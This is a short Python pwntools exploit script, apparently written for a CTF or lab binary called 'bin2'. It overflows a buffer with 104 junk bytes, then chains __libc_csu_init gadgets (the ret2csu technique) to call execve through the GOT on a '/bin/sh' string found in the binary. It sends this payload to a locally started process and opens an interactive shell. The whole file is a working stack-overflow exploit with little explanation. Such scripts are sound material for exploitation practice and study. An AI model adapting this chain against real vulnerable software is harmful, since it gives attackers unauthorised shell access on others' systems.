#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bin2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'bin2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ===================== Exploit =====================

junk = b'A'*104
libc_csu = exe.sym['__libc_csu_init']
execve_got = exe.got['execve']
bin_sh = next(exe.search(b"/bin/sh"))
nullbytes = pack(0)


payload = flat(junk, 
    libc_csu+82, 
    nullbytes * 2, 
    bin_sh, 
    nullbytes * 2, 
    execve_got, 
    libc_csu+56)


io = start()
io.sendline(payload)
io.interactive()

# exploit = payload
# with open('exploit', 'wb') as pay:
#     pay.write(exploit)